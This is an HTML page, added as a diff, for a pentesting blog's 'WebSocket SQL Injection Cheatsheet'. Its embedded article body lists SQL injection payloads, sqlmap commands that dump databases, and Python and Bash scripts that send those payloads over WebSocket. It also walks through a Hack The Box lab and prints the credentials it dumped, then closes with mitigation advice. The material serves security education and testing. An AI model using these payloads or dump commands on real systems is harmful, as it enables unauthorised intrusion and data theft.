@@ -1,0 +1,1117 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>WebSocket SQL Injection Cheatsheet | realspaceeagle</title>
+<meta name="keywords" content="websocket, sql-injection, web-security, pentesting">
+<meta name="description" content="Specialized techniques for testing and exploiting SQL injection vulnerabilities in WebSocket connections">
+<meta name="author" content="realspaceeagle">
+<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/websocket-sql-injection/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="apple-touch-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="mask-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://realspaceeagle.github.io/cheatsheets/websocket-sql-injection/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+
+<meta name="description" content="Specialized techniques for testing and exploiting SQL injection vulnerabilities in WebSocket connections">
+<meta name="keywords" content="websocket, sql-injection, web-security, pentesting">
+<meta name="author" content="realspaceeagle">
+<meta name="robots" content="index, follow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/websocket-sql-injection/">
+
+
+<meta property="og:title" content="WebSocket SQL Injection Cheatsheet - realspaceeagle">
+<meta property="og:description" content="Specialized techniques for testing and exploiting SQL injection vulnerabilities in WebSocket connections">
+<meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/websocket-sql-injection/">
+<meta property="og:site_name" content="realspaceeagle">
+<meta property="og:locale" content="en_US"><meta property="og:type" content="article">
+<meta property="article:author" content="realspaceeagle"><meta property="article:published_time" content="2024-01-01T00:00:00Z"><meta property="article:modified_time" content="2024-01-01T00:00:00Z"><meta property="article:tag" content="websocket"><meta property="article:tag" content="sql-injection"><meta property="article:tag" content="web-security"><meta property="article:tag" content="pentesting"><meta property="article:section" content="cheatsheets"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta property="og:image:alt" content="realspaceeagle">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@haran_loga">
+<meta name="twitter:creator" content="@haran_loga">
+<meta name="twitter:title" content="WebSocket SQL Injection Cheatsheet - realspaceeagle">
+<meta name="twitter:description" content="Specialized techniques for testing and exploiting SQL injection vulnerabilities in WebSocket connections"><meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta name="twitter:image:alt" content="realspaceeagle"><meta name="article:author" content="realspaceeagle">
+<meta name="article:publisher" content="https://realspaceeagle.github.io/"><meta name="news_keywords" content="websocket, sql-injection, web-security, pentesting">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org","@type": "BlogPosting",
+  "headline": "WebSocket SQL Injection Cheatsheet",
+  "description": "Specialized techniques for testing and exploiting SQL injection vulnerabilities in WebSocket connections",
+  "author": {
+    "@type": "Person",
+    "name": "realspaceeagle",
+    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
+    "description": "Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.",
+    "url": "https:\/\/realspaceeagle.github.io\/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "realspaceeagle",
+    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
+    "url": "https:\/\/realspaceeagle.github.io\/"
+  },
+  "datePublished": "2024-01-01T00:00:00Z","dateModified": "2024-01-01T00:00:00Z","url": "https:\/\/realspaceeagle.github.io\/cheatsheets\/websocket-sql-injection\/",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/realspaceeagle.github.io\/cheatsheets\/websocket-sql-injection\/"
+  },"image": {
+    "@type": "ImageObject",
+    "url": "https:\/\/realspaceeagle.github.io\/images\/og-image.svg",
+    "width": 1200,
+    "height": 630
+  },"keywords": "websocket, sql-injection, web-security, pentesting",
+  "articleSection": "cheatsheets",
+  "wordCount":  1291 ,
+  "genre": ["Cybersecurity", "Technology", "Education"],
+  "about": [{
+      "@type": "Thing",
+      "name": "websocket"
+    },{
+      "@type": "Thing",
+      "name": "sql-injection"
+    },{
+      "@type": "Thing",
+      "name": "web-security"
+    },{
+      "@type": "Thing",
+      "name": "pentesting"
+    }]}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position": 1,
+      "name": "Home",
+      "item": "https:\/\/realspaceeagle.github.io\/"
+    },{
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Cheatsheets",
+      "item": "https:\/\/realspaceeagle.github.io\/categories\/cheatsheets\/"
+    },{
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "WebSocket SQL Injection Cheatsheet",
+      "item": "https:\/\/realspaceeagle.github.io\/cheatsheets\/websocket-sql-injection\/"
+    }]
+}
+</script>
+
+
+<link rel="stylesheet" href="/css/terminal-style.css">
+
+
+<link rel="stylesheet" href="/css/scroll-enhancement.css">
+
+
+<link rel="stylesheet" href="/css/mobile-navigation.css">
+
+
+<link rel="stylesheet" href="/css/mobile-responsive-pages.css">
+
+
+<link rel="stylesheet" href="/css/header-width-fix.css">
+
+
+<link rel="stylesheet" href="/css/share-buttons.css">
+
+
+<link rel="stylesheet" href="/css/comments.css">
+
+
+<link rel="stylesheet" href="/css/blog-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/blog-sidebar.css">
+
+
+<link rel="stylesheet" href="/css/project-toggle.css">
+
+
+<link rel="stylesheet" href="/css/code-copy-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/ctf-writeup.css">
+
+
+<link rel="stylesheet" href="/css/github-stats.css">
+
+
+<link rel="stylesheet" href="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar-responsive.css" onerror="this.remove();" />
+<script src="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar.min.js" onerror="this.remove();"></script>
+
+
+<script src="/js/github-calendar-enhanced.js" defer></script>
+
+
+<script src="/js/github-contribution-tracker.js" defer></script>
+
+
+<script src="/js/github-api-fallback.js" defer></script>
+
+
+<script src="/js/github-integration.js" defer></script>
+
+
+<script src="/js/twitter-timeline.js" defer></script>
+<script src="/js/twitter-manual.js" defer></script>
+
+
+<script src="/js/code-copy-enhanced.js" defer></script>
+
+
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-GPTRZ14YZS"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-GPTRZ14YZS');
+        }
+      </script><meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/websocket-sql-injection/">
+  <meta property="og:site_name" content="realspaceeagle">
+  <meta property="og:title" content="WebSocket SQL Injection Cheatsheet">
+  <meta property="og:description" content="Specialized techniques for testing and exploiting SQL injection vulnerabilities in WebSocket connections">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="cheatsheets">
+    <meta property="article:published_time" content="2024-01-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-01-01T00:00:00+00:00">
+    <meta property="article:tag" content="Websocket">
+    <meta property="article:tag" content="Sql-Injection">
+    <meta property="article:tag" content="Web-Security">
+    <meta property="article:tag" content="Pentesting">
+      <meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:title" content="WebSocket SQL Injection Cheatsheet">
+<meta name="twitter:description" content="Specialized techniques for testing and exploiting SQL injection vulnerabilities in WebSocket connections">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Security Cheatsheets",
+      "item": "https://realspaceeagle.github.io/cheatsheets/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "WebSocket SQL Injection Cheatsheet",
+      "item": "https://realspaceeagle.github.io/cheatsheets/websocket-sql-injection/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "WebSocket SQL Injection Cheatsheet",
+  "name": "WebSocket SQL Injection Cheatsheet",
+  "description": "Specialized techniques for testing and exploiting SQL injection vulnerabilities in WebSocket connections",
+  "keywords": [
+    "websocket", "sql-injection", "web-security", "pentesting"
+  ],
+  "articleBody": "WebSocket SQL Injection Cheatsheet WebSocket Basics WebSocket Connection // Basic WebSocket connection var ws = new WebSocket(\"ws://target.com:9091\"); // With specific endpoint var ws = new WebSocket(\"ws://soc-player.soccer.htb:9091\"); // Secure WebSocket var wss = new WebSocket(\"wss://target.com:443/ws\"); WebSocket Message Format // JSON message format ws.send(JSON.stringify({ \"id\": \"value_to_test\" })) // Simple string message ws.send(\"test_value\") // Complex JSON structure ws.send(JSON.stringify({ \"action\": \"query\", \"data\": { \"id\": \"vulnerable_parameter\" } })) Testing WebSocket Connections Manual Browser Testing // Open browser console and connect var ws = new WebSocket(\"ws://soc-player.soccer.htb:9091\"); ws.onopen = function(e) { console.log('Connected to WebSocket'); } ws.onmessage = function(e) { console.log('Received:', e.data); } // Send test payloads ws.send(JSON.stringify({\"id\": \"1\"})) ws.send(JSON.stringify({\"id\": \"1'\"})) ws.send(JSON.stringify({\"id\": \"1' OR '1'='1\"})) Using wscat # Install wscat npm install -g wscat # Connect to WebSocket wscat -c ws://soc-player.soccer.htb:9091 # Send JSON payloads \u003e {\"id\":\"1\"} \u003e {\"id\":\"1'\"} \u003e {\"id\":\"1 OR 1=1\"} \u003e {\"id\":\"92130 or 5=1-- -\"} SQL Injection Detection Basic Detection Payloads // Test for errors with single quote {\"id\": \"'\"} // Test for boolean conditions {\"id\": \"1 AND 1=1\"} {\"id\": \"1 AND 1=2\"} // Test for time delays {\"id\": \"1 AND SLEEP(5)\"} {\"id\": \"1'; WAITFOR DELAY '0:0:5'--\"} // Test for union-based injection {\"id\": \"1 UNION SELECT 1,2,3\"} Error-Based Detection // MySQL error triggers {\"id\": \"1'\"} {\"id\": \"1\\\"\"} {\"id\": \"1`\"} // SQL Server error triggers {\"id\": \"1'\"} {\"id\": \"1]\"} // PostgreSQL error triggers {\"id\": \"1'\"} {\"id\": \"1$\"} Boolean-Based Detection // True condition {\"id\": \"92130 or 5=5-- -\"} // False condition {\"id\": \"92130 or 5=6-- -\"} // String comparison {\"id\": \"1' OR 'a'='a'-- -\"} {\"id\": \"1' OR 'a'='b'-- -\"} sqlmap with WebSockets Basic sqlmap Usage # Test WebSocket with JSON payload sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{\"id\":\"*\"}' --batch # With specific risk and level sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{\"id\":\"*\"}' --level 5 --risk 3 --batch # Enable threading for faster execution sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{\"id\":\"*\"}' --level 5 --risk 3 --batch --threads 10 Database Enumeration # Enumerate databases sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{\"id\":\"*\"}' --dbs --batch # Enumerate tables in specific database sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{\"id\":\"*\"}' -D soccer_db --tables --batch # Dump specific table sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{\"id\":\"*\"}' -D soccer_db -T accounts --dump --batch # Dump all data from database sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{\"id\":\"*\"}' -D soccer_db --dump --batch Advanced sqlmap Options # Force specific DBMS sqlmap -u 'ws://target:9091/' --data '{\"id\":\"*\"}' --dbms=mysql --batch # Custom tamper scripts sqlmap -u 'ws://target:9091/' --data '{\"id\":\"*\"}' --tamper=space2comment --batch # Specify injection technique sqlmap -u 'ws://target:9091/' --data '{\"id\":\"*\"}' --technique=BT --batch # Save session sqlmap -u 'ws://target:9091/' --data '{\"id\":\"*\"}' --batch --session-file=session.db Manual Exploitation Techniques Boolean-Based Blind Injection // Check for MySQL {\"id\": \"1' AND (SELECT COUNT(*) FROM information_schema.tables) \u003e 0-- -\"} // Extract database name length {\"id\": \"1' AND LENGTH(database()) = 9-- -\"} // Extract database name character by character {\"id\": \"1' AND SUBSTRING(database(),1,1) = 's'-- -\"} {\"id\": \"1' AND SUBSTRING(database(),2,1) = 'o'-- -\"} // Extract table names {\"id\": \"1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 1-- -\"} {\"id\": \"1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = 'accounts'-- -\"} Time-Based Blind Injection // MySQL time delays {\"id\": \"1' AND SLEEP(5)-- -\"} {\"id\": \"1' AND IF(LENGTH(database())=9,SLEEP(5),0)-- -\"} // SQL Server time delays {\"id\": \"1'; WAITFOR DELAY '0:0:5'-- -\"} {\"id\": \"1'; IF (LEN(DB_NAME())=9) WAITFOR DELAY '0:0:5'-- -\"} // PostgreSQL time delays {\"id\": \"1' AND (SELECT 1 FROM pg_sleep(5))-- -\"} // Conditional time delays {\"id\": \"1' AND (CASE WHEN (SUBSTRING(user(),1,1)='r') THEN SLEEP(5) ELSE 0 END)-- -\"} Union-Based Injection // Determine number of columns {\"id\": \"1' ORDER BY 1-- -\"} {\"id\": \"1' ORDER BY 2-- -\"} {\"id\": \"1' ORDER BY 3-- -\"} // Test for UNION compatibility {\"id\": \"1' UNION SELECT NULL-- -\"} {\"id\": \"1' UNION SELECT NULL,NULL-- -\"} // Extract database information {\"id\": \"1' UNION SELECT @@version,user()-- -\"} {\"id\": \"1' UNION SELECT database(),NULL-- -\"} // Extract table data {\"id\": \"1' UNION SELECT table_name,NULL FROM information_schema.tables-- -\"} {\"id\": \"1' UNION SELECT username,password FROM accounts-- -\"} WebSocket-Specific Payloads JSON Context Injection // Basic JSON structure {\"id\": \"1' OR '1'='1\"} // Nested JSON injection { \"user_data\": { \"id\": \"1' UNION SELECT password FROM users-- -\" } } // Array-based injection { \"ids\": [\"1\", \"2' OR '1'='1-- -\", \"3\"] } Message Format Variations // Different parameter names {\"user_id\": \"1' OR 1=1-- -\"} {\"session_id\": \"1' OR 1=1-- -\"} {\"query\": \"1' OR 1=1-- -\"} // Multiple parameters { \"id\": \"1\", \"type\": \"user' OR 1=1-- -\" } // Base64 encoded payloads {\"id\": \"MSBPUiAxPTEtLSAt\"} // 1 OR 1=1-- - Real-World Example: Soccer HTB Connection Setup // Target WebSocket from Soccer HTB var ws = new WebSocket(\"ws://soc-player.soccer.htb:9091\"); ws.onopen = function(e) { console.log('Connected to soccer WebSocket'); } ws.onmessage = function(e) { console.log('Response:', e.data); } Testing Process // 1. Test basic functionality ws.send(JSON.stringify({\"id\": \"1\"})) // 2. Test for SQL injection ws.send(JSON.stringify({\"id\": \"1'\"})) // 3. Boolean-based testing ws.send(JSON.stringify({\"id\": \"92130 or 5=1-- -\"})) // 4. Confirm vulnerability ws.send(JSON.stringify({\"id\": \"1 OR 1=1-- -\"})) sqlmap Exploitation # Soccer HTB WebSocket SQLi sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{\"id\":\"*\"}' --level 5 --risk 3 --batch --threads 10 -D soccer_db --dump # Results found: # Database: soccer_db # Table: accounts # [1 entry] # +------+-------------------+----------------------+----------+ # | id | email | password | username | # +------+-------------------+----------------------+----------+ # | 1324 | player@player.htb | PlayerOftheMatch2022 | player | # +------+-------------------+----------------------+----------+ Detection and Response Analysis Response Analysis # Look for different response patterns # - Response time differences (time-based) # - Content length variations (boolean-based) # - Error messages (error-based) # - Data extraction (union-based) # Response timing measurement time echo '{\"id\":\"1 AND SLEEP(5)\"}' | wscat -c ws://target:9091 Database Fingerprinting // MySQL detection {\"id\": \"1' AND @@version LIKE '%mysql%'-- -\"} // SQL Server detection {\"id\": \"1' AND @@version LIKE '%Microsoft%'-- -\"} // PostgreSQL detection {\"id\": \"1' AND version() LIKE '%PostgreSQL%'-- -\"} // SQLite detection {\"id\": \"1' AND sqlite_version() IS NOT NULL-- -\"} Automation Scripts Python WebSocket SQLi Script import websocket import json import time def test_websocket_sqli(url, payloads): def on_message(ws, message): print(f\"Response: {message}\") def on_error(ws, error): print(f\"Error: {error}\") def on_close(ws, close_status_code, close_msg): print(\"Connection closed\") def on_open(ws): print(\"Connected to WebSocket\") for payload in payloads: data = json.dumps({\"id\": payload}) print(f\"Sending: {data}\") ws.send(data) time.sleep(1) ws.close() ws = websocket.WebSocketApp(url, on_open=on_open, on_message=on_message, on_error=on_error, on_close=on_close) ws.run_forever() # Usage payloads = [ \"1\", \"1'\", \"1' OR '1'='1\", \"1' AND SLEEP(5)-- -\", \"1 UNION SELECT @@version-- -\" ] test_websocket_sqli(\"ws://target:9091\", payloads) Bash Testing Script #!/bin/bash # WebSocket SQLi Testing Script URL=\"ws://soc-player.soccer.htb:9091\" echo \"Testing WebSocket SQL Injection\" echo \"Target: $URL\" # Array of payloads to test payloads=( \"1\" \"1'\" \"1' OR '1'='1-- -\" \"92130 or 5=1-- -\" \"1 AND SLEEP(5)-- -\" \"1 UNION SELECT @@version-- -\" ) for payload in \"${payloads[@]}\"; do echo \"Testing payload: $payload\" echo \"{\\\"id\\\":\\\"$payload\\\"}\" | wscat -c $URL echo \"---\" sleep 2 done Mitigation and Prevention Secure WebSocket Implementation // Input validation function validateInput(data) { // Whitelist allowed characters if (!/^[a-zA-Z0-9_-]+$/.test(data)) { throw new Error(\"Invalid input\"); } return data; } // Parameterized queries const query = \"SELECT * FROM users WHERE id = ?\"; db.query(query, [userId], callback); // Prepared statements const stmt = db.prepare(\"SELECT * FROM users WHERE id = ?\"); stmt.run(userId); WebSocket Security Headers // Implement proper authentication ws.on('connection', function(socket, request) { // Verify JWT token or session if (!isAuthenticated(request)) { socket.close(1008, 'Authentication required'); return; } }); // Rate limiting const rateLimiter = new Map(); ws.on('message', function(data) { const clientId = getClientId(this); if (isRateLimited(clientId)) { this.close(1008, 'Rate limit exceeded'); return; } }); Tools and Resources WebSocket Testing Tools wscat - Command-line WebSocket client Burp Suite - Professional WebSocket testing OWASP ZAP - Free WebSocket proxy websocat - Advanced WebSocket client sqlmap - Automated SQL injection testing Browser Developer Tools // Chrome/Firefox WebSocket inspection // 1. Open Developer Tools (F12) // 2. Go to Network tab // 3. Filter by WS (WebSocket) // 4. Interact with application // 5. Analyze WebSocket frames WebSocket SQL injection can be particularly dangerous as it often bypasses traditional web application firewalls. Always test WebSocket endpoints during security assessments and implement proper input validation and parameterized queries.\n",
+  "wordCount" : "1291",
+  "inLanguage": "en",
+  "image": "https://realspaceeagle.github.io/images/og-image.svg","datePublished": "2024-01-01T00:00:00Z",
+  "dateModified": "2024-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": {"avatar":"/images/avatar.svg","bio":"Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.","name":"realspaceeagle","title":"Cybersecurity Professional \u0026 Penetration Tester"}
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://realspaceeagle.github.io/cheatsheets/websocket-sql-injection/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "realspaceeagle",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://realspaceeagle.github.io/favicon.svg"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://realspaceeagle.github.io/" accesskey="h" title="realspaceeagle (Alt + H)">realspaceeagle</a>
+            
+            
+            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu">
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+            </button>
+            
+            <div class="logo-switches">
+                
+                <div class="social-icons">
+                    <a href="https://www.linkedin.com/in/dream4ip/" target="_blank" rel="noopener noreferrer" 
+                       title="Connect on LinkedIn" aria-label="LinkedIn Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+                        </svg>
+                    </a>
+                    <a href="https://twitter.com/haran_loga" target="_blank" rel="noopener noreferrer" 
+                       title="Follow on X/Twitter" aria-label="Twitter Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                        </svg>
+                    </a>
+                    <a href="https://github.com/realspaceeagle" target="_blank" rel="noopener noreferrer" 
+                       title="View Code on GitHub" aria-label="GitHub Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                        </svg>
+                    </a>
+                </div>
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        
+        <ul id="menu" class="desktop-menu">
+            <li>
+                <a href="https://realspaceeagle.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                    <span>Cheatsheets</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+        
+        
+        <div id="mobile-menu" class="mobile-menu">
+            <ul class="mobile-menu-list">
+                <li>
+                    <a href="https://realspaceeagle.github.io/" title="Home">
+                        <span>Home</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/about/" title="About">
+                        <span>About</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                        <span>Archives</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                        <span>Cheatsheets</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/search/" title="Search" accesskey=/>
+                        <span>Search</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                        <span>Tags</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                        <span>Categories</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                        <span>Projects</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                        <span>Contact</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+</header>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
+    const mobileMenu = document.getElementById('mobile-menu');
+    const body = document.body;
+    
+    if (mobileMenuToggle && mobileMenu) {
+        mobileMenuToggle.addEventListener('click', function() {
+            const isOpen = mobileMenu.classList.contains('active');
+            
+            if (isOpen) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            } else {
+                mobileMenu.classList.add('active');
+                mobileMenuToggle.classList.add('active');
+                body.classList.add('mobile-menu-open');
+            }
+        });
+        
+        
+        const mobileMenuLinks = mobileMenu.querySelectorAll('a');
+        mobileMenuLinks.forEach(link => {
+            link.addEventListener('click', function() {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            });
+        });
+        
+        
+        document.addEventListener('click', function(event) {
+            if (!mobileMenu.contains(event.target) && !mobileMenuToggle.contains(event.target)) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            }
+        });
+    }
+});
+</script><main class="main">
+<link rel="stylesheet" href="/css/cheatsheet-style.css">
+
